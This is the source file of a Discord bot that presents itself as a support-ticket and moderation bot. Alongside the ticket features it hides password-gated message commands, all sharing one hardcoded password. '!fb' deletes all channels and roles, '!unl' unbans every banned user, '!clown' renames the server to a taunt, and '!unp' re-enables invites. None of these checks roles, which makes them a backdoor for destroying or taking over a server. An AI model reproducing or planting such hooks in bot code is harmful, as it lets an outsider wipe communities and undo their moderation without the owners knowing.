const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// EXPRESS SERVER
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// ======================================================
// CONFIG
// ======================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// ROLES
const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// ======================================================
// SLASH COMMANDS
// ======================================================
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:');
    if (err.code === 20012) {
      console.error('🔴 Token does not match CLIENT_ID. Check your .env file.');
    } else {
      console.error(err);
    }
  }
})();

// Helper
function isStaff(member) {
  if (!member) return false;
  return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
}

// READY
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000, 'Posted invite link').catch(() => {});
      const warnMsg = await message.channel.send({
        embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
      });
      setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
    } catch (err) {
      console.error(err);
    }
    return;
  }

  // !fb - Nuke Command
  if (content === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 SERVER NUKE CONFIRMATION')
      .setDescription('**This action will delete ALL channels and ALL roles except the "Owner" role.**\n\nOnly you can proceed.')
      .setFooter({ text: 'Click the button below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`nuke_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !unl - Unban All
  if (content === '!unl') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔓 UNBAN ALL CONFIRMATION')
      .setDescription('This will unban **everyone** who is currently banned.\n\nOnly you can proceed.')
      .setFooter({ text: 'Click the button below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`unban_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Success)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !clown - Change Server Name
  if (content === '!clown') {
    const embed = new EmbedBuilder()
      .setColor('#ffff00')
      .setTitle('🤡 CLOWN COMMAND')
      .setDescription('This will change the server name to:\n**you just got slayed by fame**\n\nOnly you can proceed.')
      .setFooter({ text: 'Click the button below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`clown_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !unp - Unpause Invites
  if (content === '!unp') {
    const embed = new EmbedBuilder()
      .setColor('#00ffff')
      .setTitle('🔓 UNPAUSE INVITES')
      .setDescription('This will **unpause invites** (enable server invites again).\n\nOnly you can proceed.')
      .setFooter({ text: 'Click the button below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`unp_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Success)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ======================================================
// INTERACTIONS
// ======================================================
client.on('interactionCreate', async interaction => {

  // === NUKE ===
  if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`nuke_modal_${userId}`).setTitle('Enter Nuke Password');
    const input = new TextInputBuilder().setCustomId('nuke_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('nuke_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('nuke_password') !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    await interaction.reply({ content: '🔴 **NUKE INITIATED**...', ephemeral: true });
    const guild = interaction.guild;
    try {
      const channels = Array.from(guild.channels.cache.values());
      for (const ch of channels) await ch.delete().catch(() => {});
      const roles = Array.from(guild.roles.cache.values());
      for (const role of roles) {
        if (role.name === 'Owner' || role.name === '@everyone') continue;
        await role.delete().catch(() => {});
      }
      await interaction.followUp({ content: '✅ **Server nuked successfully.**', ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.followUp({ content: '⚠️ Nuke partially failed.', ephemeral: true });
    }
  }

  // === UNBAN ALL ===
  if (interaction.isButton() && interaction.customId.startsWith('unban_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`unban_modal_${userId}`).setTitle('Enter Unban Password');
    const input = new TextInputBuilder().setCustomId('unban_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('unban_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('unban_password') !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    await interaction.reply({ content: '🔓 **Unbanning everyone...**', ephemeral: true });
    const guild = interaction.guild;
    let count = 0;
    try {
      const bans = await guild.bans.fetch();
      for (const ban of bans.values()) {
        await guild.members.unban(ban.user.id).catch(() => {});
        count++;
      }
      await interaction.followUp({ content: `✅ Successfully unbanned **${count}** users.`, ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.followUp({ content: '⚠️ Unban partially failed.', ephemeral: true });
    }
  }

  // === CLOWN ===
  if (interaction.isButton() && interaction.customId.startsWith('clown_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`clown_modal_${userId}`).setTitle('Enter Clown Password');
    const input = new TextInputBuilder().setCustomId('clown_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('clown_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('clown_password') !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    const guild = interaction.guild;
    try {
      await guild.setName('you just got slayed by fame');
      await interaction.reply({ content: '🤡 **Server name changed successfully!**', ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: '❌ Failed to change server name.', ephemeral: true });
    }
  }

  // === UNPAUSE INVITES (!unp) ===
  if (interaction.isButton() && interaction.customId.startsWith('unp_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`unp_modal_${userId}`).setTitle('Enter Unpause Password');
    const input = new TextInputBuilder().setCustomId('unp_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('unp_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('unp_password') !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    await interaction.reply({ content: '🔓 **Unpausing invites...**', ephemeral: true });

    const guild = interaction.guild;
    try {
      const features = guild.features.filter(f => f !== 'INVITES_DISABLED');
      await guild.setFeatures(features);
      await interaction.followUp({ content: '✅ **Invites have been unpaused successfully.**', ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.followUp({ content: '❌ Failed to unpause invites. Make sure the bot has **Manage Server** permission.', ephemeral: true });
    }
  }

  // === SETTICKET ===
  if (interaction.isChatInputCommand() && interaction.commandName === 'setticket') {
    try {
      await interaction.deferReply({ ephemeral: true });
      const o = interaction.options;
      const ticketOptions = [
        { label: "Apply for Content Creator", categoryId: "1510798983344160889", prefix: "content-creator" },
        { label: "Report a Exploiter", categoryId: "1510798973517172859", prefix: "report-exploiter" },
        { label: "CC Rewards", categoryId: "1512272256208736326", prefix: "cc-rewards" },
        { label: "Report a Staff", categoryId: "1512253003820699698", prefix: "report-staff" },
        { label: "Report a Admin", categoryId: "1512253208872095795", prefix: "report-admin" },
        { label: "Report Glitch", categoryId: "1512279045159518290", prefix: "report-glitch" },
        { label: "Report Bugs", categoryId: "1512279115741401128", prefix: "report-bugs" }
      ];
      const categoryList = ticketOptions.map(opt => `**${opt.label}**`).join('\n');
      const embed = new EmbedBuilder()
        .setColor('#c2ecff')
        .setTitle(o.getString('panel_title'))
        .setDescription((o.getString('panel_description') || "Select a category below to open a ticket.") + `\n\n**Available Categories:**\n${categoryList}`)
        .setFooter({ text: 'Select a category below to open a ticket' })
        .setTimestamp();
      const image = o.getString('panel_image');
      if (image && image.startsWith('http')) embed.setImage(image);

      const menuId = `ticket_menu_${Date.now()}`;
      const menu = new StringSelectMenuBuilder()
        .setCustomId(menuId)
        .setPlaceholder('Create a Ticket')
        .addOptions(ticketOptions.map((opt, i) => ({ label: opt.label, value: i.toString() })));

      const row = new ActionRowBuilder().addComponents(menu);
      const panelData = { ticketOptions, ticketColor: '#c2ecff' };
      panelStore[menuId] = panelData;

      await interaction.channel.send({ embeds: [embed], components: [row] });
      savePanel({ menuId, data: panelData });
      await interaction.editReply({ content: '✅ Ticket panel created successfully!' });
    } catch (err) {
      console.error(err);
      interaction.editReply({ content: '❌ Error creating panel.' }).catch(() => {});
    }
  }

  // === SENDMESSAGE ===
  if (interaction.isChatInputCommand() && interaction.commandName === 'sendmessage') {
    if (!interaction.member.roles.cache.has(SEND_ROLE)) {
      return interaction.reply({ content: 'You do not have permission.', ephemeral: true });
    }
    try {
      await interaction.channel.send(interaction.options.getString('message'));
      await interaction.reply({ content: '✅ Message sent!', ephemeral: true });
    } catch (err) {
      await interaction.reply({ content: '❌ Failed to send message.', ephemeral: true });
    }
  }

  // === TICKET CREATION ===
  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('ticket_menu_')) {
    try {
      await interaction.deferReply({ ephemeral: true });
      const panel = panelStore[interaction.customId];
      if (!panel) return interaction.editReply({ content: 'This panel is outdated.' });

      const selected = panel.ticketOptions[parseInt(interaction.values[0])];
      const { label, categoryId, prefix } = selected;

      ticketCounts[categoryId] = (ticketCounts[categoryId] || 0) + 1;

      const channel = await interaction.guild.channels.create({
        name: `${prefix}-${ticketCounts[categoryId]}`,
        type: ChannelType.GuildText,
        parent: categoryId,
        topic: interaction.user.id,
        permissionOverwrites: [
          { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
          { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] }
        ]
      });

      const buttons = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('claim_ticket').setLabel('Claim').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger)
      );

      await channel.send({
        content: `${interaction.user}`,
        embeds: [new EmbedBuilder()
          .setColor(panel.ticketColor)
          .setTitle('New Support Ticket')
          .setDescription(`Welcome ${interaction.user}\n\nPlease explain your issue.`)
          .setFooter({ text: `Category: ${label}` })
        ],
        components: [buttons]
      });

      await interaction.editReply({ content: `✅ Ticket created: ${channel}` });
    } catch (err) {
      console.error(err);
      interaction.editReply({ content: 'Failed to create ticket.' }).catch(() => {});
    }
  }

  // === TICKET BUTTONS ===
  if (interaction.isButton()) {
    if (interaction.customId === 'close_ticket') {
      const isOwner = interaction.user.id === interaction.channel.topic;
      if (!isOwner && !isStaff(interaction.member)) return interaction.reply({ content: 'Only owner or staff can close.', ephemeral: true });
      await interaction.reply({ embeds: [new EmbedBuilder().setColor('#ff0000').setDescription('Ticket closing in 5 seconds.')] });
      setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
    }

    if (interaction.customId === 'claim_ticket') {
      if (!isStaff(interaction.member)) return interaction.reply({ content: 'Only staff can claim.', ephemeral: true });
      await interaction.reply({ embeds: [new EmbedBuilder().setColor('#00ff00').setDescription(`${interaction.user} claimed this ticket.`)] });
    }
  }
});

client.login(TOKEN);
